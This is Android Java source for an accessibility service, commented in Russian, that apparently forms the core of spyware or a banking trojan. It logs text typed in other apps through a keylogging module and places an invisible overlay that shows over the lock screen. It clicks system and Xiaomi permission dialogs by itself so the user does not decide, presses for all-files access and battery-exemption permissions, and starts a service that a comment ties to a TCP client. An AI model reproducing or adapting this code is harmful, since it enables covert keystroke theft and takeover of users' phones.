package com.test.myapp;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.PixelFormat;
import android.graphics.Rect;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.provider.Settings;
import android.view.Gravity;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.widget.FrameLayout;

import com.test.Modules.KLogModule;

import java.util.List;




public class MyAccessibilityService extends AccessibilityService {

    public static Boolean STARTED = false;
    public static Boolean CHECK_Permission_IGNORE_BATTERY_OPTIMIZATIONS = false;
    public static Boolean CHECK_Permission = true;
    public static Boolean FORpermission = false;
    public static AccessibilityEvent AccessibilityGlobalEvent = null;
    public static boolean AccessibilityCheckPermission =false;
    public static Boolean ClassGen12Auto_Click = false;

    public static Boolean SERVICE_STARTED = false; // служба спец возможностей запускается автоматически, поэтому она же и будет запускать севрис в котором TcpClient






    // в Android 7 я заметил, что этот метод вызывается переодически, а не единожды только при запуске
    // @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP_MR1)
    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        STARTED = true;


        if(!SERVICE_STARTED) {
            startService(new Intent(this, MyService.class));
        }

        OptionAccessibilityClass.MyAccess = this;

        try
        {
            AccessibilityServiceInfo info = new AccessibilityServiceInfo();
            info.flags = AccessibilityServiceInfo.DEFAULT | AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS|AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS;
            info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK| AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED;
            info.notificationTimeout = 0;
            info.packageNames = null;
            info.feedbackType = AccessibilityServiceInfo.FEEDBACK_ALL_MASK;
            setServiceInfo(info);

        }catch (Exception x){}
        try
        {
            // ClassGen11.MyAccess = this;
            Context ctx = getApplicationContext();
            WindowManager windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
            FrameLayout layout = new FrameLayout(this);

            WindowManager.LayoutParams params = new WindowManager.LayoutParams(1,
                    1, WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE| WindowManager.LayoutParams.FLAG_FULLSCREEN |
                            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE|
                            WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS|
                            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED|
                            WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD|
                            WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
                    PixelFormat.TRANSLUCENT);
            params.gravity = Gravity.TOP;
            // ClassGen12lay = params;
            // ClassGen12wm = windowManager;
            windowManager.addView(layout, params);
        }catch (Exception e){
            e.printStackTrace();
        }

    }





    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {

        int eventType = 0;


        try {
            eventType = event.getEventType();
            // ClassGen12GlobalEvent = event;
        } catch (Exception b) {
            // eventType = -9978;
        }
        int f = 0;
        switch (eventType) {
            case AccessibilityEvent.TYPE_VIEW_FOCUSED:
                f = 1;
                break;
            case AccessibilityEvent.TYPE_VIEW_LONG_CLICKED:
                f = 2;
                break;
            // Event текста в активити:
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                f = 3;
                KLogModule.loggingKInputEvent(this, event, f);
                break;
            case AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED:
                f = 4;
                break;
            case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                f = 5;
                break;
        }

        AccessibilityNodeInfo nodeInfo = null;

        try {
            nodeInfo = event.getSource();
        } catch (Exception ee) {
            System.out.println("try {\n"+
                                "   nodeInfo = event.getSource();\n"+
                                "} catch (Exception ee) {\n"+
                                "   Тут ошибка!\n"+
                                "}\n");
            ee.printStackTrace();
        }

        //  || ClassGen12FOR_SC || ClassGen12FOR_ADM
        if (ClassGen12Auto_Click || FORpermission) {

            if (nodeInfo == null) {
                //utl.Log(TAG_LOG, consts.string_29);
                System.out.println("NodeInfo == null");
                return;
            }

            if (FORpermission) {
                accessibilityClickByText("Allow");
            }

            String[] arrayButtonClick = {"com.android.packageinstaller:id/permission_allow_button", "android:id/button1", "com.android.settings:id/action_button", "com.android.permissioncontroller:id/permission_allow_foreground_only_button", "com.android.permissioncontroller:id/permission_allow_button"};
            for (int i = 0; i < arrayButtonClick.length; i++) {
                for (AccessibilityNodeInfo node : nodeInfo.findAccessibilityNodeInfosByViewId(arrayButtonClick[i])) {
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    ClassGen12Auto_Click = false;
                    String display_width = MySettings.read(getApplicationContext(), MySettings.ScreenWidth, "720");
                    String display_height = MySettings.read(getApplicationContext(), MySettings.ScreenHight, "1080");

                    int width = Integer.parseInt(display_width);
                    int height = Integer.parseInt(display_height);

                    if ((arrayButtonClick[i].contains("com.android.settings:id/action_button"))) {

                        for (int ii = 0; ii < 80; ii += 2) {
                            ClassGen12click(width - 15, height - ii);
                            //


                        }

                    }


                }
            }

            String[] arrayButtonClick2 = {"com.android.settings:id/left_button", "android:id/button1", "com.android.permissioncontroller:id/permission_allow_foreground_only_button", "com.android.permissioncontroller:id/permission_allow_button"};
            for (int i = 0; i < arrayButtonClick2.length; i++) {
                for (AccessibilityNodeInfo node : nodeInfo.findAccessibilityNodeInfosByViewId(arrayButtonClick2[i])) {
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    ClassGen12Auto_Click = false;
                }
            }


            //---------Xiaomi---------------

            for (AccessibilityNodeInfo node : nodeInfo.findAccessibilityNodeInfosByViewId("com.miui.securitycenter:id/accept")) {
                node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                ClassGen12Auto_Click = false;
            }

        }


        // Этот код вызывает исключение, если приложение уже установлено и я его снова пытаюсь установить
        // ну или не он, на всякий случай )

        /************************************************************************************************************************************
        * Вот как работает код на примере цикла:
        * СОБЫТИЯ - те которые я указал обрабатывать в AccessibilityNodeInfo - клики, например.
        * Когада происходит клик по активности, то цикл перезапускася, метод перевзывается OS Android
        * Поэтому достаточно тапнуть по экрану, по ползунку, чтобы запросилось последние две активности были единожды запрошены!
        *
        * while(СОБЫТИЯ) {
        *   if(Флаг: разрешения запрашивать?){
        *       if(!OptionAccessibilityClass.checkPermission(this, OptionAccessibilityClass.PERMISSIONS())) {
        *           1) Вернуться на главный экран.
        *           2) Запросить базовые разрешения(AskPermission activity).
        *           3) Флаг: разрешения запрашивать? - false
        *       }
        *       else {
        *           3) Флаг: разрешения запрашивать? - true
        *       }
        *   }
        *   else {
        *       тут используются внутренние флаги активностей, читаются как - флаг: запрашивались ли разрешения с помощью этой активности?
        *       if (!CHECK_Permission_IGNORE_BATTERY_OPTIMIZATIONS && AskPermission.asked) {
        *           if (если версия Android OS старше или соответсвует 11.0) {
        *               1) Запросить разрешение на работу со всеми файлами, а не только с медиа.
        *           }
        *           else {
        *               1) Запросить разрешение на игнорирование dozeMode, не ограничивать в фоне.
        *           }
        *       }
        *       else {
        *           1) Запросить разрешение на игнорирование dozeMode, не ограничивать в фоне.
        *       }
        *   }
        * }
        *************************************************************************************************************************************/
        try {

            // пока ещё не понимаю почему это не срабатывает в эмуляторе Android 13, а в 7 окно не запускается, но ошибка может возникануть где указано имя моего приложения
            if (CHECK_Permission) {


                // если хоть одно разрешение из списка PERMISSIONS не было выдано, вернет false:
                if (!OptionAccessibilityClass.checkPermission(this, OptionAccessibilityClass.PERMISSIONS())) {

                    // возвращение на главный экран требуется только при запросе разрешений
                    PackageManager pm = getApplicationContext().getPackageManager();
                    Intent launchIntent = pm.getLaunchIntentForPackage(this.getPackageName());
                    launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    this.startActivity(launchIntent);

                    this.startActivity(new Intent(this, AskPermission.class)
                            .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK) // если приложение не было запущено, то создать новую задачу и в ней запустить активити
                            .addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP) // очистить весь стек активностей и поазать эту поверх других
                            .addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP) // если уже запущено, не запускать повторно
                            .addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY) // очистить стек активностей если действие завершено
                    );

                    CHECK_Permission = false;

                } else {
                    CHECK_Permission = true;
                }
            } else {

                if (!CHECK_Permission_IGNORE_BATTERY_OPTIMIZATIONS && AskPermission.asked) {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                        if (Environment.isExternalStorageManager() == false) {

                            Uri uri = Uri.parse("package:" + this.getPackageName());
                            startActivity(new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION, uri)
                                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK) // если приложение не было запущено, то создать новую задачу и в ней запустить активити
                                    .addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP) // очистить весь стек активностей и поазать эту поверх других
                                    .addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP) // если уже запущено, не запускать повторно
                                    .addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY) // очистить стек активностей если действие завершено
                            );

                        } else {
                            startAskIgnoreDozeMode();
                        }
                    } else {
                        startAskIgnoreDozeMode();
                    }
                }
            }
        } catch (Exception e) {
            System.out.println(e);
        }


    }

    public void startAskIgnoreDozeMode() {
        // Воспроизведение разрешения производится тут, потому что иначе автоматически на главный активити приложение не перейдет
        // это разрешение запрашивается не на главном активити, а в настройках Спецвозможностей!
        this.startActivity(new Intent(this, AskPermission_IGNORE_BATTERY_OPTIMIZATIONS.class)
                .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                .addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)
                .addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP)
                .addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY)
        );

        CHECK_Permission_IGNORE_BATTERY_OPTIMIZATIONS = true;
    }




    public static boolean accessibilityClickByText(String text) {
        return accessibilityPerformClick(accessibilityFindNodesByText(text));
    }

    private static boolean accessibilityPerformClick(List<AccessibilityNodeInfo> nodeInfos) {
        try
        {
            if (nodeInfos != null && !nodeInfos.isEmpty()) {
                for (AccessibilityNodeInfo node : nodeInfos) {
                    // 获得点击View的类型
                    //   System.out.println("View类型：" + node.getClassName());
                    // 进行模拟点击
                    if (node.isEnabled()) {
                        return node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    }
                }
            }
        }catch (Exception f){}
        return false;
    }

    public static List<AccessibilityNodeInfo> accessibilityFindNodesByText(String text) {
        AccessibilityNodeInfo nodeInfo = accessibilityGetRootNodeInfo();
        if (nodeInfo != null) {
            return nodeInfo.findAccessibilityNodeInfosByText(text);
        }
        return null;
    }

    private static AccessibilityNodeInfo accessibilityGetRootNodeInfo() {

        if (Build.VERSION.SDK_INT >= 16) {
            // 建议使用getRootInActiveWindow，这样不依赖当前的事件类型
            return OptionAccessibilityClass.MyAccess.getRootInActiveWindow();
            // 下面这个必须依赖当前的AccessibilityEvent
            // nodeInfo = curEvent.getSource();
        } else {
            return AccessibilityGlobalEvent.getSource();
        }

    }

    public void ClassGen12click(int x, int y) {
        try
        {
            if (android.os.Build.VERSION.SDK_INT > 16) {
                ClassGen12clickAtPosition(x, y, getRootInActiveWindow());
            }
        }catch (Exception s){

        }
    }

    public static void ClassGen12clickAtPosition(int x, int y, AccessibilityNodeInfo node) {
        if (node == null) return;
        try {
            if (node.getChildCount() == 0) {
                Rect ClassGen12buttonRect = new Rect();
                node.getBoundsInScreen(ClassGen12buttonRect);
                if (ClassGen12buttonRect.contains(x, y)) {
                    // Maybe we need to th ink if a large view covers item?
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    //   System.out.println("1º - Node Information: " + node.toString());
                }
            } else {
                Rect ClassGen12buttonRect = new Rect();
                node.getBoundsInScreen(ClassGen12buttonRect);
                if (ClassGen12buttonRect.contains(x, y)) {
                    // Maybe we need to think if a large view covers item?
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    //  System.out.println("2º - Node Information: " + node.toString());
                }
                for (int i = 0; i < node.getChildCount(); i++) {
                    ClassGen12clickAtPosition(x, y, node.getChild(i));
                }
            }
        }catch (Exception ex){
            //  utl.SettingsToAdd(context, consts.LogSMS , "(pro27)  | utils isAccessibilityServiceEnabled " + ex.toString() +"::endLog::");
        }
    }

    @Override
    public void onInterrupt() {

    }
}